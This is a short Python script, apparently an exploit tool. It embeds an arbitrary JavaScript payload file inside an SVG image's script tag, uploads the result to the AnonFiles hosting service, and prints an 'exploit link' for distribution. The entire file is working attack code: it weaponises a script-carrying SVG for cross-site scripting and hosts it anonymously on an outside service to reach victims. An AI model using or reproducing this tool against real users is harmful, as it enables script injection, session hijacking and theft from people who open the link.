import requests
import argparse
import sys
import os
import io

PAYLOAD_TEMPLATE = """<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <rect width="0" height="0" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
    <script type="text/javascript">
        {}
    </script>
</svg>"""

def exploit(payload_name, js_payload):
    mem_f = io.BytesIO((PAYLOAD_TEMPLATE.format(js_payload)).encode())
    res = requests.post('https://api.anonfiles.com/upload', files={'file': (payload_name, mem_f)})
    if res.status_code == 200:
        return res.json()['data']['file']['url']['full']
    return None

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--js-payload', required=True)
    parser.add_argument('-n', '--file-name', required=True)

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()

    if not os.path.exists(args.js_payload) or os.path.isdir(args.js_payload):
        print(f'[-] unknown file path: {args.js_payload}')
        sys.exit(1)

    with open(args.js_payload, encoding='utf-8', errors='ignore') as f:
        jsp_payload = f.read()

    dl_link = exploit(args.file_name, jsp_payload)

    if dl_link is None:
        parser.error('an error occurred when uploading file')

    print(f'[+] payload uploaded! exploit link: {dl_link}')
